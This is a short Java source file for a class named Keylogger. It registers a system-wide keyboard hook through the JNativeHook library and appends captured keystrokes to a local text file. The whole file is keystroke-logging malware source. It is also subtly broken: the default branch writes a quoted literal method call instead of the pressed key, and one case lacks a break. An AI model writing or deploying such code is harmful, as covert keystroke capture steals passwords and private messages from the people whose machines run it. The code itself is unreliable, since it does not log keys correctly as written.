package main;

import java.io.FileWriter;
import java.io.IOException;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener  {

	
	
	public static void main(String[] args) {
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException ex) {
			
		}
		
			
			GlobalScreen.addNativeKeyListener(new Keylogger());
		
		
	}
	
	
	public void nativeKeyPressed(NativeKeyEvent nke) {
		switch (nke.getKeyCode()) {
		case NativeKeyEvent.VC_SPACE:
			try {
				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
				fw.write(" ");
				fw.close();
			} catch (IOException ex) {
				
			}
				//System.out.println(" ");
			break;
		case NativeKeyEvent.VC_ENTER:
			try {
				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
				fw.write("\n");
				fw.close();
			} catch (IOException ex) {
				
			}
			break;
		case NativeKeyEvent.VC_DOWN:
			try {
				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
				fw.write("down Arrow ");
				fw.close();
			} catch (IOException ex) {
				
			}
			break;
		case NativeKeyEvent.VC_UP:
			try {
				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
				fw.write("up Arrow");
				fw.close();
			} catch (IOException ex) {
				
			}
		
		default:
			try {
				FileWriter fw = new FileWriter("src//keylogger//keylogger.txt",true);
				fw.write("NativeKeyEvent.getKeyText(nke.getKeyCode())");
				fw.close();
			} catch (IOException ex) {
				
			}
			
			break;
		}
	}
}
